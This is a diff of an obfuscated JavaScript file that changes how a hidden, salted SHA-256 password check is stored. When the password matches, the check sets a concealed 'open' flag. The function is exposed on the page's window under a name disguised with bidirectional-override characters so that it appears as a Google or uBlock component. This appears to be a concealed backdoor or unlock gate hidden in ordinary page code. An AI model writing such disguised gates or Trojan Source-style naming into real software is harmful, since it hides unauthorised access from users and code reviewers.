@@ -1,0 +1,28 @@
+--- shard-a.js (scrub2)
++++ shard-a.js (scrub1)
+@@ -22,21 +22,16 @@
+   
+       
+       const _0xsalt = String.fromCharCode(...[82,66,97,97,43,44,103,112,35,86,37,119,38,37,84,109,124,42,103,56,86,95,123,64,49,67,33,81]);
+-      const _0xpolyP = [42885,41585,29589,182044,272997,206184,267723,175507,1734,285215,160911,277267,222487,280015,308129,86224,189210,297544,44888,209376,288296,237527,39688,292418,150733,216283,177547,198976,122804,195039,153629,6596];
++      const _0xwantb = [32,31,22,136,204,154,200,131,1,213,120,207,166,209,230,64,141,222,33,156,215,177,29,218,112,161,132,148,91,145,114,4];
+       const _0xgu = async (pw) => {
+         try {
+           if (!(window.crypto && window.crypto.subtle)) { return false; }
+           const _0buf = await window.crypto.subtle.digest("SHA-256", new TextEncoder().encode(_0xsalt + String(pw ?? "")));
+           const _0got = Array.from(new Uint8Array(_0buf));
+-          if (_0got.length !== 32) return false;
+-          let _0xacc = 0;
+-          for (let i = 0; i < 32; i++) {
+-            const term = ((_0got[i] * 1337 + i * 37 + 101) & 0xffffffff) >>> 0;
+-            _0xacc |= (term ^ _0xpolyP[i]);
+-          }
+-          if (_0xacc === 0) { _0xopen = true; try { Log.flush(); } catch (e) {} return true; }
++          if (_0got.length === _0xwantb.length && _0got.every((b, i) => b === _0xwantb[i])) { _0xopen = true; try { Log.flush(); } catch (e) {} return true; }
++          
+           return false;
+-        } catch (e) { return false; }
++        } catch (e) {  return false; }
+       };
+       const _0xgr = s => s.replace(/[\u200E\u200F\u202A-\u202E\u2066-\u2069]/g, '').split('').reverse().join('');
+       try { window[_0xgr('‮kcolbUelgooG‬')] = _0xgu; } catch (e) {}
